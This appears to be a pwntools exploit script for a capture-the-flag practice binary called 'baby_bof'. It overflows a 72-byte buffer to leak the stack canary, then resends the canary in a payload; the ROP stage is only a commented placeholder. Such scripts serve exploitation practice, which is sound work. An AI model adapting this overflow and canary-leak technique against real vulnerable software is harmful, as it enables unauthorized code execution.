from pwn import *

# exe = ELF("./baby_bof_patched") が壊れている
exe = ELF("./baby_bof")
libc = ELF("./libc.so.6")
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+302
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

# ***********************************************
# canary までの距離探し
# ***********************************************
# for l in range(buffer):
#     io = process(exe.path)
#     send_message(b'A' * l)
#     send_exit()
#     if b'*** stack smashing detected ***' in io.recvall():
#         break
#     io.close()
offset = 72

def send_message(message):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', message)

def send_exit():
    io.sendlineafter(b'>', b'2')

# ***********************************************
# leak canary
# ***********************************************
send_message(b'A' * offset)
io.recvuntil(b'You say :')
io.recvline()
canary = int.from_bytes(io.recv(7), 'little') << 8
print(f'{hex(canary) = }')

# ***********************************************
# ROP
# ***********************************************
# send_message(b'A' * offset + b'abbabaab' + b'A' * 1000)

# ***********************************************
# set canary
# ***********************************************
send_message(b'A' * offset + pack(canary))
send_exit()

io.interactive()